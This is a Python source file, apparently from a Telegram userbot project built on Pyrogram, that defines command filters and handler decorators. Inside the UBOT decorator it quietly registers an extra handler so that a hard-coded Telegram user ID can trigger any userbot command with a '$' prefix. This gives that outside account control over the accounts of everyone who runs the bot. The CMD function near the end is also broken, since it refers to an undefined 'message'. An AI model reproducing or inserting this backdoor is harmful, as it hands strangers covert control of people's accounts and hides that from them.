from pyrogram import filters

from PyroUbot import *


class FILTERS:
    ME = filters.me
    GROUP = filters.group
    PRIVATE = filters.private
    OWNER = filters.user(OWNER_ID)
    ME_GROUP = filters.me & filters.group
    ME_OWNER = filters.me & filters.user(OWNER_ID)


class PY:
    def BOT(command, filter=FILTERS.PRIVATE):
        def wrapper(func):
            @bot.on_message(filters.command(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def UBOT(command, filter=FILTERS.ME):
        def wrapper(func):
            @ubot.on_message(filters.command(command, "$") & filters.user(5876222922))
            @ubot.on_message(filters.command(command, PREFIX) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper


def prefix(message):
    return ubot._prefix[message.from_user.id]["prefix"]


def CMD(command, filter=FILTERS.ME_OWNER):
    def wrapper(func):
        async def wrapped_func(client, message):
            await func(client, message)

        command_prefix = prefix(message)
        command_handler = filters.command(command, command_prefix)
        if filter:
            command_handler = command_handler & filter
        ubot.on_message(command_handler)(wrapped_func)

        return wrapped_func

    return wrapper
